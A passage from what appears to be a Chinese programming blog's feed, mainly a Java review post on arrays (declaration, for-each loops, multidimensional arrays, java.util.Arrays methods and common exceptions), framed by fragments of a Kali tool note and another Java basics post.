class="hljs-number">6.</span>再一直回车，遇到输入就输入Y（yes）即可<br><br>当出现done,thinks <span class="hljs-keyword">for</span> <span class="hljs-keyword">using</span> 时，表示克隆完成。<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Kali工具使用笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>JAVA基础知识复习(四)-数组</title>
    <link href="/2021/04/11/JAVA/JAVA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0(%E5%9B%9B)-%E6%95%B0%E7%BB%84/"/>
    <url>/2021/04/11/JAVA/JAVA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0(%E5%9B%9B)-%E6%95%B0%E7%BB%84/</url>
    
    <content type="html"><![CDATA[<p>JAVA基础知识复习(四)，数组复习。</p><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><h3 id="1-声明数组变量"><a href="#1-声明数组变量" class="headerlink" title="1.声明数组变量"></a>1.声明数组变量</h3><blockquote><p>1.声明创建数组</p></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">int</span>[] a=<span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[<span class="hljs-number">10</span>]; <span class="hljs-comment">//首选</span><br><span class="hljs-keyword">int</span> aa[]=<span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[<span class="hljs-number">10</span>]; <span class="hljs-comment">//C/C++形式，效果相同，但不是最好的选择</span><br><span class="hljs-keyword">int</span>[] b=&#123;<span class="hljs-number">2</span>,<span class="hljs-number">5</span>,<span class="hljs-number">14</span>,<span class="hljs-number">5</span>,<span class="hljs-number">3</span>&#125;; <span class="hljs-comment">//创建并初始化</span><br></code></pre></div></td></tr></table></figure><blockquote><p>2.加强for（For-Each循环）<br>JDK 1.5 引进了一种新的循环类型，被称为 For-Each 循环或者加强型循环，它能在不使用下标的情况下遍历数组。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">for</span>(type element: array)&#123; <br>    System.out.println(element);<br>&#125;<br>如：<br><span class="hljs-keyword">int</span>[] a=&#123;<span class="hljs-number">12</span>,<span class="hljs-number">51</span>,<span class="hljs-number">6</span>,<span class="hljs-number">6</span>,<span class="hljs-number">1</span>&#125;;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> t:a)&#123;<br>System.out.println(t);<br>&#125;<br><span class="hljs-comment">//输出结果</span><br><span class="hljs-number">12</span><br><span class="hljs-number">51</span><br><span class="hljs-number">6</span><br><span class="hljs-number">6</span><br><span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure><blockquote><p>3.数组作为函数的参数<br>数组可以作为参数传递给方法。例如：</p></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">printArray</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] array)</span> </span>&#123;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; array.length; i++) &#123;<br>    System.out.print(array[i] + <span class="hljs-string">&quot; &quot;</span>);<br>  &#125;<br>&#125;<br><span class="hljs-comment">//调用方法输出结果</span><br>printArray(<span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[]&#123;<span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>&#125;);<br></code></pre></div></td></tr></table></figure><blockquote><p>4.函数作为函数的返回值</p></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span>[] reverse(<span class="hljs-keyword">int</span>[] list) &#123;<br>  <span class="hljs-keyword">int</span>[] result = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[list.length];<br> <br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>, j = result.length - <span class="hljs-number">1</span>; i &lt; list.length; i++, j--) &#123;<br>    result[j] = list[i];<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="2-多维数组"><a href="#2-多维数组" class="headerlink" title="2.多维数组"></a>2.多维数组</h3><p>多维数组可以看成是数组的数组，比如二维数组就是一个特殊的一维数组，其每一个元素都是一个一维数组。</p><blockquote><p>一.直接为一维分配空间</p></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">int</span>[][] b=<span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[<span class="hljs-number">5</span>][<span class="hljs-number">2</span>];<br></code></pre></div></td></tr></table></figure><blockquote><p>二.分别为一维分配空间</p></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">String s[][] = <span class="hljs-keyword">new</span> String[<span class="hljs-number">2</span>][]; <span class="hljs-comment">//这里的String 可以换成其他类型</span><br>s[<span class="hljs-number">0</span>] = <span class="hljs-keyword">new</span> String[<span class="hljs-number">2</span>];<span class="hljs-comment">//为最高维分配引用空间，也就是为最高维限制其能保存数据的最长的长度,下同。</span><br>s[<span class="hljs-number">1</span>] = <span class="hljs-keyword">new</span> String[<span class="hljs-number">3</span>];<br>s[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = <span class="hljs-keyword">new</span> String(<span class="hljs-string">&quot;Good&quot;</span>); <span class="hljs-comment">//为其每个数组元素单独分配空间，下同</span><br>s[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] = <span class="hljs-keyword">new</span> String(<span class="hljs-string">&quot;Luck&quot;</span>);<br>s[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] = <span class="hljs-keyword">new</span> String(<span class="hljs-string">&quot;to&quot;</span>);<br>s[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] = <span class="hljs-keyword">new</span> String(<span class="hljs-string">&quot;you&quot;</span>);<br>s[<span class="hljs-number">1</span>][<span class="hljs-number">2</span>] = <span class="hljs-keyword">new</span> String(<span class="hljs-string">&quot;!&quot;</span>);<br></code></pre></div></td></tr></table></figure><h3 id="3-Arrays-类"><a href="#3-Arrays-类" class="headerlink" title="3.Arrays 类"></a>3.Arrays 类</h3><p>java.util.Arrays 类能方便地操作数组，它提供的所有方法都是静态的。<br>具有一下功能：</p><blockquote><p>1.给数组赋值：通过 fill 方法。<br>2.对数组排序：通过 sort 方法,按升序。sort只提供升序排序，并不支持降序排序。但可以倒序输出即可。如果一定要用 sort 实现降序排序，可以参考《java知识拓展》博文。<br>3.比较数组：通过 equals 方法比较数组中元素值是否相等。<br>4.查找数组元素：通过 binarySearch 方法能对排序好的数组进行二分查找法操作。</p></blockquote><h4 id="Java中Arrays类的常用方法"><a href="#Java中Arrays类的常用方法" class="headerlink" title="Java中Arrays类的常用方法"></a>Java中Arrays类的常用方法</h4><blockquote><p>1.Arrays类位于 java.util 包中，主要包含了操作数组的各种方法。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Arrays;<br></code></pre></div></td></tr></table></figure><blockquote><p>2.Arrays.fill(); //填充数组</p></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//实用一</span><br>    <span class="hljs-keyword">int</span>[] arr = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[<span class="hljs-number">5</span>];<span class="hljs-comment">//新建一个大小为5的数组</span><br>Arrays.fill(arr,<span class="hljs-number">4</span>);<span class="hljs-comment">//给所有值赋值4</span><br>String str = Arrays.toString(arr); <span class="hljs-comment">// Arrays类的toString()方法能将数组中的内容全部打印出来</span><br>System.out.print(str);<br><span class="hljs-comment">//输出：[4, 4, 4, 4, 4]</span><br><br><span class="hljs-comment">//实用二</span><br><span class="hljs-keyword">int</span>[] arr = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[<span class="hljs-number">5</span>];<span class="hljs-comment">//新建一个大小为5的数组</span><br>Arrays.fill(arr,<span class="hljs-number">2</span>,<span class="hljs-number">4</span>,<span class="hljs-number">6</span>);<span class="hljs-comment">//[2,4) 下标从0开始。下标为2（包括）到下标为4（不包括）全部赋值为6</span><br>String str = Arrays.toString(arr); <span class="hljs-comment">// Arrays类的toString()方法能将数组中的内容全部打印出来</span><br>System.out.print(str);<br><span class="hljs-comment">//输出：[0, 0, 6, 6, 0]</span><br></code></pre></div></td></tr></table></figure><blockquote><p>3.Arrays.sort(); //数组排序</p></blockquote><p>Arrays类有一个静态方法sort，利用这个方法可传入要排序的数组进去排序，因为传入的是一个数组的引用，所以排序完成的结果也通过这个引用来更改数组。</p><p><strong>1.数字排序</strong></p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">int</span>[] intArray = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[] &#123; <span class="hljs-number">4</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, -<span class="hljs-number">23</span> &#125;;<br>Arrays.sort(intArray);<br><span class="hljs-comment">//输出： [-23, 1, 3, 4]</span><br></code></pre></div></td></tr></table></figure><p><strong>2.字符串排序，先大写后小写</strong><br>因为大写字母的ASCII码比小写字母的小。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">String[] strArray = <span class="hljs-keyword">new</span> String[] &#123; “z”, “a”, “C” &#125;;<br>Arrays.sort(strArray);<br><span class="hljs-comment">//输出： [C, a, z]</span><br></code></pre></div></td></tr></table></figure><p><strong>3.严格按字母表顺序排序，也就是忽略大小写排序</strong></p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">String[] strArray = <span class="hljs-keyword">new</span> String[] &#123; “z”, “a”, “C” &#125;;<br>   Arrays.sort(strArray, String.CASE_INSENSITIVE_ORDER);<br>   <span class="hljs-comment">//输出： [a, C, z]</span><br></code></pre></div></td></tr></table></figure><p><strong>4.反向排序</strong><br>在数字数组中可以实现降序排序。大写字母的ASCII码比小写字母的小。需要导包 import java.util.Collections; 或者使用import java.util.*;。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">String[] strArray = <span class="hljs-keyword">new</span> String[] &#123; “z”, “a”, “C” &#125;;<br>   Arrays.sort(strArray, Collections.reverseOrder());<br>   <span class="hljs-comment">//输出：[z, a, C]</span><br></code></pre></div></td></tr></table></figure><p><strong>5.忽略大小写反向排序</strong><br>可以理解成把所有的字母转换成对应小写字母或大写字母。转换成一种进行比较。<br>但是，当数组中有一个大写字母C和一个小写字母c时，大写字母C会在小写字母c前面，其他同理。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">String[] strArray = <span class="hljs-keyword">new</span> String[] &#123; “z”, “a”, “C” &#125;;<br>   Arrays.sort(strArray, String.CASE_INSENSITIVE_ORDER);<br>   Collections.reverse(Arrays.asList(strArray));<br>   <span class="hljs-comment">//输出： [z, C, a]</span><br></code></pre></div></td></tr></table></figure><p><strong>6.选择数组指定位置进行排序</strong></p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">int</span>[] arr = &#123;<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">5</span>,<span class="hljs-number">4</span>&#125;;<br>Arrays.sort(arr,<span class="hljs-number">0</span>,<span class="hljs-number">3</span>);<span class="hljs-comment">//[0,3)，小标0开始。 从小标0开始（包括）到下标为3（不包括）的区间进行排序</span><br>String str = Arrays.toString(arr); <span class="hljs-comment">// Arrays类的toString()方法能将数组中的内容全部打印出来</span><br>System.out.print(str);<br><span class="hljs-comment">//输出：[1, 2, 3, 5, 4]</span><br></code></pre></div></td></tr></table></figure><blockquote><p>4.Arrays.toString(); //将数组中的内容全部打印出来</p></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">   <span class="hljs-keyword">int</span>[] arr = &#123;<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">5</span>,<span class="hljs-number">4</span>&#125;;<br>   System.out.print(arr);<span class="hljs-comment">//直接将数组打印输出</span><br>   <span class="hljs-comment">//输出：[I@7852e922 (数组的地址)</span><br><br>String str = Arrays.toString(arr); <span class="hljs-comment">// Arrays类的toString()方法能将数组中的内容全部打印出来</span><br><span class="hljs-comment">//System.out.print(str);</span><br><span class="hljs-comment">//输出：[3, 2, 1, 5, 4]</span><br></code></pre></div></td></tr></table></figure><blockquote><p>5.Arrays.equals(); //比较数组元素是否相等</p></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">int</span>[] arr1 = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;;<br><span class="hljs-keyword">int</span>[] arr2 = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;;<br>System.out.println(Arrays.equals(arr1,arr2));<br><span class="hljs-comment">//输出：true</span><br><span class="hljs-comment">//如果是arr1.equals(arr2),则返回false，因为equals比较的是两个对象的地址，不是里面的数，而Arrays.equals重写了equals，所以，这里能比较元素是否相等。至于‘=’与equals的区别可见另一篇博文《java知识拓展》。</span><br></code></pre></div></td></tr></table></figure><blockquote><p>6.Arrays.binarySearch(); //二分查找法找指定元素的索引值（下标）</p></blockquote><p>数组一定是排好序的，否则会出错。找到元素，只会返回最后一个位置。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">int</span>[] arr = &#123;<span class="hljs-number">10</span>,<span class="hljs-number">20</span>,<span class="hljs-number">30</span>,<span class="hljs-number">40</span>,<span class="hljs-number">50</span>&#125;;<br>System.out.println(Arrays.binarySearch(arr, <span class="hljs-number">30</span>));<br>   <span class="hljs-comment">//输出：2 （下标索引值从0开始）</span><br></code></pre></div></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">int</span>[] arr = &#123;<span class="hljs-number">10</span>,<span class="hljs-number">20</span>,<span class="hljs-number">30</span>,<span class="hljs-number">40</span>,<span class="hljs-number">50</span>&#125;;<br>System.out.println(Arrays.binarySearch(arr, <span class="hljs-number">36</span>));<br><span class="hljs-comment">//输出：-4 （找不到元素，返回-x，从-1开始数，如题，返回-4）</span><br></code></pre></div></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">int</span> []arr = &#123;<span class="hljs-number">10</span>,<span class="hljs-number">20</span>,<span class="hljs-number">30</span>,<span class="hljs-number">40</span>,<span class="hljs-number">50</span>&#125;;<br>System.out.println(Arrays.binarySearch(arr, <span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">30</span>));<br><span class="hljs-comment">//输出：2 （从0到3位（不包括）找30，找到了，在第2位，返回2）</span><br></code></pre></div></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">int</span> []arr = &#123;<span class="hljs-number">10</span>,<span class="hljs-number">20</span>,<span class="hljs-number">30</span>,<span class="hljs-number">40</span>,<span class="hljs-number">50</span>&#125;;<br>System.out.println(Arrays.binarySearch(arr, <span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">40</span>));<br><span class="hljs-comment">//输出：-4 （从0到3位（不包括）找40，找不到，从-1开始数，返回-4）</span><br></code></pre></div></td></tr></table></figure><blockquote><p>7.Arrays.copeOf() 和Arrays.copeOfRange(); //截取数组</p></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">int</span>[] arr = &#123;<span class="hljs-number">10</span>,<span class="hljs-number">20</span>,<span class="hljs-number">30</span>,<span class="hljs-number">40</span>,<span class="hljs-number">50</span>&#125;;<br><span class="hljs-keyword">int</span>[] arr1 = Arrays.copyOf(arr, <span class="hljs-number">3</span>);<span class="hljs-comment">//[0,3)。下标从0开始，到下标为3为止(不包括3)。</span><br>String str = Arrays.toString(arr1); <span class="hljs-comment">// Arrays类的toString()方法能将数组中的内容全部打印出来</span><br>System.out.print(str);<br><span class="hljs-comment">//输出：[10, 20, 30] （截取arr数组的3个元素赋值给姓数组arr1）</span><br></code></pre></div></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">int</span> []arr = &#123;<span class="hljs-number">10</span>,<span class="hljs-number">20</span>,<span class="hljs-number">30</span>,<span class="hljs-number">40</span>,<span class="hljs-number">50</span>&#125;;<br><span class="hljs-keyword">int</span> []arr1 = Arrays.copyOfRange(arr,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>);<br>String str = Arrays.toString(arr1); <span class="hljs-comment">// Arrays类的toString()方法能将数组中的内容全部打印出来</span><br>System.out.print(str);<br><span class="hljs-comment">//输出：[20, 30] （从第1位（0开始）截取到第3位（不包括）</span><br></code></pre></div></td></tr></table></figure><h3 id="4-数组容量扩充"><a href="#4-数组容量扩充" class="headerlink" title="4.数组容量扩充"></a>4.数组容量扩充</h3><p>数组容量如果不够用可以使用 Arrays.copyOf() 进行扩容。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Array.copy(E[] e,newLength);<br></code></pre></div></td></tr></table></figure><p>其中第一个形参指的是需要扩容的数组，后面是扩容后的大小。其内部实现其实是使用了 System.arrayCopy(); 在内部重新创建一个长度为 newLength 类型是 E 的数组。<br>例如：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Arrays;  <br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span>[] a= &#123;<span class="hljs-number">10</span>,<span class="hljs-number">20</span>,<span class="hljs-number">30</span>,<span class="hljs-number">40</span>,<span class="hljs-number">50</span>&#125;;<br>        a= Arrays.copyOf(a,a.length+<span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;a.length;i++) &#123;<br>            System.out.println(a[i]);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//输出结果</span><br><span class="hljs-number">10</span> <span class="hljs-number">20</span> <span class="hljs-number">30</span> <span class="hljs-number">40</span> <span class="hljs-number">50</span> <span class="hljs-number">0</span> <span class="hljs-comment">//默认补充0</span><br></code></pre></div></td></tr></table></figure><h3 id="5-数组中的常见异常"><a href="#5-数组中的常见异常" class="headerlink" title="5.数组中的常见异常"></a>5.数组中的常见异常</h3><h4 id="5-1数组下标越界（ArrayIndexOutOfBoundsException）"><a href="#5-1数组下标越界（ArrayIndexOutOfBoundsException）" class="headerlink" title="5.1数组下标越界（ArrayIndexOutOfBoundsException）"></a>5.1数组下标越界（ArrayIndexOutOfBoundsException）</h4><p>错误代码：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">int</span>[] arr = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[]&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>&#125;;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;=arr.length;++i)&#123;<span class="hljs-comment">//数组的存值，下标是前闭后开的，即：存5个数，则下标是[0,5)的。是不包含5的。</span><br>System.out.println(arr[i]);<br>&#125;<br>System.out.println(arr[-<span class="hljs-number">2</span>]); <span class="hljs-comment">//下标越界。</span><br><span class="hljs-comment">//当出现异常之后，后面的代码是不能运行的。如：</span><br>System.out.println(arr[-<span class="hljs-number">2</span>]); <span class="hljs-comment">//下标越界。</span><br>System.out.println(<span class="hljs-string">&quot;hello world!&quot;</span>);<span class="hljs-comment">//不会输出</span><br></code></pre></div></td></tr></table></figure><h4 id="5-2空指针异常（NullPointerException）"><a href="#5-2空指针异常（NullPointerException）" class="headerlink" title="5.2空指针异常（NullPointerException）"></a>5.2空指针异常（NullPointerException）</h4><p>错误代码一：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">int</span>[] arr = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[]&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;;<br>arr = <span class="hljs-keyword">null</span>;<span class="hljs-comment">//注释掉这句代码则可以正常运行。</span><br>System.out.println(arr[<span class="hljs-number">0</span>]);<span class="hljs-comment">//会出现异常。</span><br></code></pre></div></td></tr></table></figure><p>错误代码二：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">int</span>[][] arr = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[<span class="hljs-number">4</span>][];<br>System.out.println(arr[<span class="hljs-number">0</span>]);<span class="hljs-comment">//执行这句代码不会出错。会输出null</span><br>System.out.println(arr[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]);<span class="hljs-comment">//执行会出现空指针异常</span><br></code></pre></div></td></tr></table></figure><p>错误代码三：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">String[] arr = <span class="hljs-keyword">new</span> String[]&#123;<span class="hljs-string">&quot;AA&quot;</span>,<span class="hljs-string">&quot;BB&quot;</span>,<span class="hljs-string">&quot;CC&quot;</span>&#125;;<br>System.out.println(arr[<span class="hljs-number">0</span>].toString());<span class="hljs-comment">//输出 AA</span><br>arr[<span class="hljs-number">0</span>] = <span class="hljs-keyword">null</span>;<br>System.out.println(arr[<span class="hljs-number">0</span>].toString());<span class="hljs-comment">//会出现空指针异常</span><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>JAVA基础知识复习(一)-正文</title>
    <link href="/2021/04/09/JAVA/JAVA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0(%E4%B8%80)-%E6%AD%A3%E6%96%87/"/>
    <url>/2021/04/09/JAVA/JAVA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0(%E4%B8%80)-%E6%AD%A3%E6%96%87/</url>
    
    <content type="html"><![CDATA[<p>JAVA基础知识简单复习一。</p><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><h3 id="1-基本框架"><a href="#1-基本框架" class="headerlink" title="1.基本框架"></a>1.基本框架</h3><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//创建文件 HelloWorld.java(文件名需与类名一致)</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloWorld</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        System.out.println(<span 